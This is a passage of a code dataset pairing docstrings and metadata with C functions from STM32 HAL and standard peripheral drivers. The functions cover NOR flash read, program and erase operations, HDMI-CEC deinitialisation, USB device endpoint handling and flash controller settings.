uint16_t *)Address;\n    tmp_sr2 = *(__IO uint16_t *)Address;\n\n    /* If DQ6 did not toggle between the two reads then return NOR_Success */\n    if((tmp_sr1 & NOR_MASK_STATUS_DQ6) == (tmp_sr2 & NOR_MASK_STATUS_DQ6)) \n    {\n      return HAL_NOR_STATUS_SUCCESS;\n    }\n    \n    if((tmp_sr1 & NOR_MASK_STATUS_DQ5) != NOR_MASK_STATUS_DQ5)\n    {\n      status = HAL_NOR_STATUS_ONGOING;\n    }\n    \n    tmp_sr1 = *(__IO uint16_t *)Address;\n    tmp_sr2 = *(__IO uint16_t *)Address;\n\n    /* If DQ6 did not toggle between the two reads then return NOR_Success */\n    if((tmp_sr1 & NOR_MASK_STATUS_DQ6) == (tmp_sr2 & NOR_MASK_STATUS_DQ6)) \n    {\n      return HAL_NOR_STATUS_SUCCESS;\n    }\n    else if((tmp_sr1 & NOR_MASK_STATUS_DQ5) == NOR_MASK_STATUS_DQ5)\n    {\n      return HAL_NOR_STATUS_ERROR;\n    } \n  }\n\n  /* Return the operation status */\n  return status;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief DeInitializes the CEC peripheral \n  * @param hcec CEC handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_CEC_DeInit(CEC_HandleTypeDef *hcec)", "code": "{\n  /* Check the CEC handle allocation */\n  if(hcec == NULL)\n  {\n    return HAL_ERROR;\n  }\n\n  /* Check the parameters */\n  assert_param(IS_CEC_ALL_INSTANCE(hcec->Instance));\n\n  hcec->gState = HAL_CEC_STATE_BUSY;\n  \n  /* DeInit the low level hardware */\n  HAL_CEC_MspDeInit(hcec);\n  /* Disable the Peripheral */\n  __HAL_CEC_DISABLE(hcec);\n  \n  /* Clear Flags */\n  __HAL_CEC_CLEAR_FLAG(hcec,CEC_FLAG_TXEND|CEC_FLAG_TXBR|CEC_FLAG_RXBR|CEC_FLAG_RXEND|CEC_ISR_ALL_ERROR);\n  \n  /* Disable the following CEC Transmission/Reception interrupts as\n   * well as the following CEC Transmission/Reception Errors interrupts \n   * Rx Byte Received IT \n   * End of Reception IT \n   * Rx overrun\n   * Rx bit rising error\n   * Rx short bit period error\n   * Rx long bit period error\n   * Rx missing acknowledge\n   * Tx Byte Request IT \n   * End of Transmission IT\n   * Tx Missing Acknowledge IT\n   * Tx-Error IT\n   * Tx-Buffer Underrun IT \n   * Tx arbitration lost   */\n  __HAL_CEC_DISABLE_IT(hcec, CEC_IT_RXBR|CEC_IT_RXEND|CEC_IER_RX_ALL_ERR|CEC_IT_TXBR|CEC_IT_TXEND|CEC_IER_TX_ALL_ERR);\n  \n  hcec->ErrorCode = HAL_CEC_ERROR_NONE;\n  hcec->gState = HAL_CEC_STATE_RESET;\n  hcec->RxState = HAL_CEC_STATE_RESET;\n  \n  /* Process Unlock */\n  __HAL_UNLOCK(hcec);\n  \n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_cec.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Disables dynamically NOR write operation.\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_WriteOperation_Disable(NOR_HandleTypeDef *hnor)", "code": "{\n  /* Process Locked */\n  __HAL_LOCK(hnor);\n\n  /* Update the SRAM controller state */\n  hnor->State = HAL_NOR_STATE_BUSY;\n    \n  /* Disable write operation */\n  FMC_NORSRAM_WriteOperation_Disable(hnor->Instance, hnor->Init.NSBank); \n  \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_PROTECTED;\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor); \n  \n  return HAL_OK;  \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Read data from NOR memory \n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @param  pAddress pointer to Device address\n  * @param  pData pointer to read data  \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_Read(NOR_HandleTypeDef *hnor, uint32_t *pAddress, uint16_t *pData)", "code": "{\n  uint32_t deviceaddress = 0U;\n  \n  /* Process Locked */\n  __HAL_LOCK(hnor);\n  \n  /* Check the NOR controller state */\n  if(hnor->State == HAL_NOR_STATE_BUSY)\n  {\n     return HAL_BUSY;\n  }\n    \n  /* Select the NOR device address */\n  if (hnor->Init.NSBank == FMC_NORSRAM_BANK1)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS1;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK2)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS2;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK3)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS3;\n  }\n  else /* FMC_NORSRAM_BANK4 */\n  {\n    deviceaddress = NOR_MEMORY_ADRESS4;\n  } \n    \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_BUSY;\n  \n  /* Send read data command */\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FIRST), NOR_CMD_DATA_FIRST); \n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_SECOND), NOR_CMD_DATA_SECOND);  \n  NOR_WRITE((uint32_t)pAddress, NOR_CMD_DATA_READ_RESET);\n\n  /* Read the data */\n  *pData = *(__IO uint32_t *)(uint32_t)pAddress;\n  \n  /* Check the NOR controller state */\n  hnor->State = HAL_NOR_STATE_READY;\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor);\n  \n  return HAL_OK;  \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Erase the entire NOR chip.\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @param  Address Device address  \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_Erase_Chip(NOR_HandleTypeDef *hnor, uint32_t Address)", "code": "{\n  uint32_t deviceaddress = 0U;\n  \n  /* Process Locked */\n  __HAL_LOCK(hnor);\n  \n  /* Check the NOR controller state */\n  if(hnor->State == HAL_NOR_STATE_BUSY)\n  {\n     return HAL_BUSY;\n  }\n    \n  /* Select the NOR device address */\n  if (hnor->Init.NSBank == FMC_NORSRAM_BANK1)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS1;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK2)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS2;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK3)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS3;\n  }\n  else /* FMC_NORSRAM_BANK4 */\n  {\n    deviceaddress = NOR_MEMORY_ADRESS4;\n  }\n    \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_BUSY;  \n    \n  /* Send NOR chip erase command sequence */\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FIRST), NOR_CMD_DATA_FIRST);\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_SECOND), NOR_CMD_DATA_SECOND);\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_THIRD), NOR_CMD_DATA_CHIP_BLOCK_ERASE_THIRD);\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FOURTH), NOR_CMD_DATA_CHIP_BLOCK_ERASE_FOURTH);\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FIFTH), NOR_CMD_DATA_CHIP_BLOCK_ERASE_FIFTH);  \n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_SIXTH), NOR_CMD_DATA_CHIP_ERASE);\n  \n  /* Check the NOR memory status and update the controller state */\n  hnor->State = HAL_NOR_STATE_READY;\n    \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor);\n  \n  return HAL_OK;  \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Reads a block of data from the FMC NOR memory.\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @param  uwAddress NOR memory internal address to read from.\n  * @param  pData pointer to the buffer that receives the data read from the \n  *         NOR memory.\n  * @param  uwBufferSize number of Half word to read.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_ReadBuffer(NOR_HandleTypeDef *hnor, uint32_t uwAddress, uint16_t *pData, uint32_t uwBufferSize)", "code": "{\n  uint32_t deviceaddress = 0U;\n  \n  /* Process Locked */\n  __HAL_LOCK(hnor);\n  \n  /* Check the NOR controller state */\n  if(hnor->State == HAL_NOR_STATE_BUSY)\n  {\n     return HAL_BUSY;\n  }\n    \n  /* Select the NOR device address */\n  if (hnor->Init.NSBank == FMC_NORSRAM_BANK1)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS1;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK2)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS2;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK3)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS3;\n  }\n  else /* FMC_NORSRAM_BANK4 */\n  {\n    deviceaddress = NOR_MEMORY_ADRESS4;\n  }  \n    \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_BUSY;\n  \n  /* Send read data command */\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FIRST), NOR_CMD_DATA_FIRST); \n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_SECOND), NOR_CMD_DATA_SECOND);  \n  NOR_WRITE(uwAddress, NOR_CMD_DATA_READ_RESET);\n  \n  /* Read buffer */\n  while( uwBufferSize > 0U) \n  {\n    *pData++ = *(__IO uint16_t *)uwAddress;\n    uwAddress += 2U;\n    uwBufferSize--;\n  } \n  \n  /* Check the NOR controller state */\n  hnor->State = HAL_NOR_STATE_READY;\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor);\n  \n  return HAL_OK;  \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  NOR MSP Wait fro Ready/Busy signal\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @param  Timeout Maximum timeout value\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_NOR_MspWait(NOR_HandleTypeDef *hnor, uint32_t Timeout)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hnor);\n  UNUSED(Timeout);\n\n  /* NOTE : This function Should not be modified, when the callback is needed,\n            the HAL_NOR_MspWait could be implemented in the user file\n   */ \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Send an amount of data  \n  * @param  hpcd PCD handle\n  * @param  ep_addr endpoint address\n  * @param  pBuf pointer to the transmission buffer   \n  * @param  len amount of data to be sent\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Transmit(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)", "code": "{\n  PCD_EPTypeDef *ep;\n  uint16_t pmabuffer = 0U;\n    \n  ep = &hpcd->IN_ep[ep_addr & 0x7F];\n  \n  /*setup and start the Xfer */\n  ep->xfer_buff = pBuf;  \n  ep->xfer_len = len;\n  ep->xfer_count = 0U;\n  ep->is_in = 1U;\n  ep->num = ep_addr & 0x7FU;\n\n  /*Multi packet transfer*/\n  if (ep->xfer_len > ep->maxpacket)\n  {\n    len=ep->maxpacket;\n    ep->xfer_len-=len; \n  }\n  else\n  {  \n    len=ep->xfer_len;\n    ep->xfer_len =0U;\n  }\n  \n  /* configure and validate Tx endpoint */\n  if (ep->doublebuffer == 0U) \n  {\n    PCD_WritePMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, len);\n    PCD_SET_EP_TX_CNT(hpcd->Instance, ep->num, len);\n  }\n  else\n  {\n    /*Write the data to the USB endpoint*/\n    if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num)& USB_EP_DTOG_TX) == USB_EP_DTOG_TX)\n    {\n      pmabuffer = ep->pmaaddr1;\n    }\n    else\n    {\n      pmabuffer = ep->pmaaddr0;\n    }\n    PCD_WritePMA(hpcd->Instance, ep->xfer_buff, pmabuffer, len);\n    PCD_FreeUserBuffer(hpcd->Instance, ep->num, ep->is_in)\n  }\n\n  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID)\n\n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Perform NOR memory De-Initialization sequence\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_DeInit(NOR_HandleTypeDef *hnor)", "code": "{\n  /* De-Initialize the low level hardware (MSP) */\n  HAL_NOR_MspDeInit(hnor);\n \n  /* Configure the NOR registers with their reset values */\n  FMC_NORSRAM_DeInit(hnor->Instance, hnor->Extended, hnor->Init.NSBank);\n  \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_RESET;\n\n  /* Release Lock */\n  __HAL_UNLOCK(hnor);\n\n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Program data to NOR memory \n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @param  pAddress Device address\n  * @param  pData pointer to the data to write   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_Program(NOR_HandleTypeDef *hnor, uint32_t *pAddress, uint16_t *pData)", "code": "{\n  uint32_t deviceaddress = 0U;\n  \n  /* Process Locked */\n  __HAL_LOCK(hnor);\n  \n  /* Check the NOR controller state */\n  if(hnor->State == HAL_NOR_STATE_BUSY)\n  {\n     return HAL_BUSY;\n  }\n    \n  /* Select the NOR device address */\n  if (hnor->Init.NSBank == FMC_NORSRAM_BANK1)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS1;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK2)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS2;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK3)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS3;\n  }\n  else /* FMC_NORSRAM_BANK4 */\n  {\n    deviceaddress = NOR_MEMORY_ADRESS4;\n  } \n    \n  /* Update the NOR controller state */\n  hnor->State = HAL_NOR_STATE_BUSY;\n  \n  /* Send program data command */\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_FIRST), NOR_CMD_DATA_FIRST);\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_SECOND), NOR_CMD_DATA_SECOND);\n  NOR_WRITE(NOR_ADDR_SHIFT(deviceaddress, uwNORMemoryDataWidth, NOR_CMD_ADDRESS_THIRD), NOR_CMD_DATA_PROGRAM);\n\n  /* Write the data */\n NOR_WRITE(pAddress, *pData);\n  \n  /* Check the NOR controller state */\n  hnor->State = HAL_NOR_STATE_READY;\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor);\n  \n  return HAL_OK;  \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Data IN stage callbacks\n  * @param  hpcd PCD handle\n  * @param  epnum endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_DataInStageCallback could be implemented in the user file\n   */ \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Open and configure an endpoint\n  * @param  hpcd PCD handle\n  * @param  ep_addr endpoint address\n  * @param  ep_mps endpoint max packet size\n  * @param  ep_type endpoint type   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint16_t ep_mps, uint8_t ep_type)", "code": "{\n  HAL_StatusTypeDef  ret = HAL_OK;\n  PCD_EPTypeDef *ep;\n  \n  if ((ep_addr & 0x80U) == 0x80U)\n  {\n    ep = &hpcd->IN_ep[ep_addr & 0x7FU];\n  }\n  else\n  {\n    ep = &hpcd->OUT_ep[ep_addr & 0x7FU];\n  }\n  ep->num   = ep_addr & 0x7FU;\n  \n  ep->is_in = (0x80U & ep_addr) != 0U;\n  ep->maxpacket = ep_mps;\n  ep->type = ep_type;\n  \n  __HAL_LOCK(hpcd); \n\n  /* initialize Endpoint */\n  switch (ep->type)\n  {\n  case PCD_EP_TYPE_CTRL:\n    PCD_SET_EPTYPE(hpcd->Instance, ep->num, USB_EP_CONTROL);\n    break;\n  case PCD_EP_TYPE_BULK:\n    PCD_SET_EPTYPE(hpcd->Instance, ep->num, USB_EP_BULK);\n    break;\n  case PCD_EP_TYPE_INTR:\n    PCD_SET_EPTYPE(hpcd->Instance, ep->num, USB_EP_INTERRUPT);\n    break;\n  case PCD_EP_TYPE_ISOC:\n    PCD_SET_EPTYPE(hpcd->Instance, ep->num, USB_EP_ISOCHRONOUS);\n    break;\n  default:\n    break;\n  } \n  \n  PCD_SET_EP_ADDRESS(hpcd->Instance, ep->num, ep->num);\n  \n  if (ep->doublebuffer == 0U) \n  {\n    if (ep->is_in)\n    {\n      /*Set the endpoint Transmit buffer address */\n      PCD_SET_EP_TX_ADDRESS(hpcd->Instance, ep->num, ep->pmaadress);\n      PCD_CLEAR_TX_DTOG(hpcd->Instance, ep->num)\n      /* Configure NAK status for the Endpoint*/\n      PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_NAK) \n    }\n    else\n    {\n      /*Set the endpoint Receive buffer address */\n      PCD_SET_EP_RX_ADDRESS(hpcd->Instance, ep->num, ep->pmaadress);\n      /*Set the endpoint Receive buffer counter*/\n      PCD_SET_EP_RX_CNT(hpcd->Instance, ep->num, ep->maxpacket)\n      PCD_CLEAR_RX_DTOG(hpcd->Instance, ep->num)\n      /* Configure VALID status for the Endpoint*/\n      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_VALID)\n    }\n  }\n  /*Double Buffer*/\n  else\n  {\n    /*Set the endpoint as double buffered*/\n    PCD_SET_EP_DBUF(hpcd->Instance, ep->num);\n    /*Set buffer address for double buffered mode*/\n    PCD_SET_EP_DBUF_ADDR(hpcd->Instance, ep->num,ep->pmaaddr0, ep->pmaaddr1)\n    \n    if (ep->is_in==0U)\n    {\n      /* Clear the data toggle bits for the endpoint IN/OUT*/\n      PCD_CLEAR_RX_DTOG(hpcd->Instance, ep->num)\n      PCD_CLEAR_TX_DTOG(hpcd->Instance, ep->num)\n      \n      /* Reset value of the data toggle bits for the endpoint out*/\n      PCD_TX_DTOG(hpcd->Instance, ep->num);\n      \n      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_VALID)\n      PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_DIS)\n    }\n    else\n    {\n      /* Clear the data toggle bits for the endpoint IN/OUT*/\n      PCD_CLEAR_RX_DTOG(hpcd->Instance, ep->num)\n      PCD_CLEAR_TX_DTOG(hpcd->Instance, ep->num)\n      PCD_RX_DTOG(hpcd->Instance, ep->num);\n      /* Configure DISABLE status for the Endpoint*/\n      PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_DIS)\n      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_DIS)\n    }\n  } \n  \n  __HAL_UNLOCK(hpcd);   \n  return ret;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Incomplete ISO OUT callbacks\n  * @param  hpcd PCD handle\n  * @param  epnum endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_ISOOUTIncompleteCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_ISOOUTIncompleteCallback could be implemented in the user file\n   */ \n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Receive an amount of data  \n  * @param  hpcd PCD handle\n  * @param  ep_addr endpoint address\n  * @param  pBuf pointer to the reception buffer   \n  * @param  len amount of data to be received\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)", "code": "{\n  \n PCD_EPTypeDef *ep;\n  \n  ep = &hpcd->OUT_ep[ep_addr & 0x7F];\n  \n  /*setup and start the Xfer */\n  ep->xfer_buff = pBuf;  \n  ep->xfer_len = len;\n  ep->xfer_count = 0U;\n  ep->is_in = 0U;\n  ep->num = ep_addr & 0x7FU;\n\n  /* Multi packet transfer*/\n  if (ep->xfer_len > ep->maxpacket)\n  {\n    len=ep->maxpacket;\n    ep->xfer_len-=len; \n  }\n  else\n  {\n    len=ep->xfer_len;\n    ep->xfer_len =0U;\n  }\n  \n  /* configure and validate Rx endpoint */\n  if (ep->doublebuffer == 0U) \n  {\n    /*Set RX buffer count*/\n    PCD_SET_EP_RX_CNT(hpcd->Instance, ep->num, len)\n  }\n  else\n  {\n    /*Set the Double buffer counter*/\n    PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len)\n  } \n  \n  PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_VALID)\n\n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_pcd.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/**\n  * @brief  Returns the NOR memory to Read mode.\n  * @param  hnor pointer to a NOR_HandleTypeDef structure that contains\n  *                the configuration information for NOR module.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_NOR_ReturnToReadMode(NOR_HandleTypeDef *hnor)", "code": "{\n  uint32_t deviceaddress = 0U;  \n  \n  /* Process Locked */\n  __HAL_LOCK(hnor);\n  \n  /* Check the NOR controller state */\n  if(hnor->State == HAL_NOR_STATE_BUSY)\n  {\n     return HAL_BUSY;\n  }\n  \n  /* Select the NOR device address */\n  if (hnor->Init.NSBank == FMC_NORSRAM_BANK1)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS1;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK2)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS2;\n  }\n  else if (hnor->Init.NSBank == FMC_NORSRAM_BANK3)\n  {\n    deviceaddress = NOR_MEMORY_ADRESS3;\n  }\n  else /* FMC_NORSRAM_BANK4 */\n  {\n    deviceaddress = NOR_MEMORY_ADRESS4;\n  }  \n  \n  NOR_WRITE(deviceaddress, NOR_CMD_DATA_READ_RESET);\n\n  /* Check the NOR controller state */\n  hnor->State = HAL_NOR_STATE_READY;\n  \n  /* Process unlocked */\n  __HAL_UNLOCK(hnor);   \n  \n  return HAL_OK;\n}", "path": "stmbl/lib/STM32F3xx_HAL_Driver/Src/stm32f3xx_hal_nor.c", "commit_date": "2018-03-02 00:00:00", "repo_name": "rene-dev/stmbl", "stars": 807, "license": "gpl-3.0", "language": "c", "size": 42676}
{"docstring": "/* STM32F10X_XL */\n/**\n  * @brief  Waits for a Flash operation to complete or a TIMEOUT to occur.\n  * @note   This function can be used for all STM32F10x devices, \n  *         it is equivalent to FLASH_WaitForLastBank1Operation.\n  *         - For STM32F10X_XL devices this function waits for a Bank1 Flash operation\n  *           to complete or a TIMEOUT to occur.\n  *         - For all other devices it waits for a Flash operation to complete \n  *           or a TIMEOUT to occur.\n  * @param  Timeout: FLASH programming Timeout\n  * @retval FLASH Status: The returned value can be: FLASH_ERROR_PG,\n  *         FLASH_ERROR_WRP, FLASH_COMPLETE or FLASH_TIMEOUT.\n  */\n", "func_signal": "FLASH_Status FLASH_WaitForLastOperation(uint32_t Timeout)", "code": "{ \n  FLASH_Status status = FLASH_COMPLETE;\n   \n  /* Check for the Flash Status */\n  status = FLASH_GetBank1Status();\n  /* Wait for a Flash operation to complete or a TIMEOUT to occur */\n  while((status == FLASH_BUSY) && (Timeout != 0x00))\n  {\n    status = FLASH_GetBank1Status();\n    Timeout--;\n  }\n  if(Timeout == 0x00 )\n  {\n    status = FLASH_TIMEOUT;\n  }\n  /* Return the operation status */\n  return status;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
{"docstring": "/**\n  * @brief  Enables or disables the Prefetch Buffer.\n  * @note   This function can be used for all STM32F10x devices.\n  * @param  FLASH_PrefetchBuffer: specifies the Prefetch buffer status.\n  *   This parameter can be one of the following values:\n  *     @arg FLASH_PrefetchBuffer_Enable: FLASH Prefetch Buffer Enable\n  *     @arg FLASH_PrefetchBuffer_Disable: FLASH Prefetch Buffer Disable\n  * @retval None\n  */\n", "func_signal": "void FLASH_PrefetchBufferCmd(uint32_t FLASH_PrefetchBuffer)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FLASH_PREFETCHBUFFER_STATE(FLASH_PrefetchBuffer));\n  \n  /* Enable or disable the Prefetch Buffer */\n  FLASH->ACR &= ACR_PRFTBE_Mask;\n  FLASH->ACR |= FLASH_PrefetchBuffer;\n}", "path": "STM32F103/Example_SysTick/StdPeriph_Driver/src/stm32f10x_flash.c", "commit_date": "2018-07-03 00:00:00", "repo_name": "avislab/STM32F103", "stars": 778, "license": "None", "language": "c", "size": 20182}
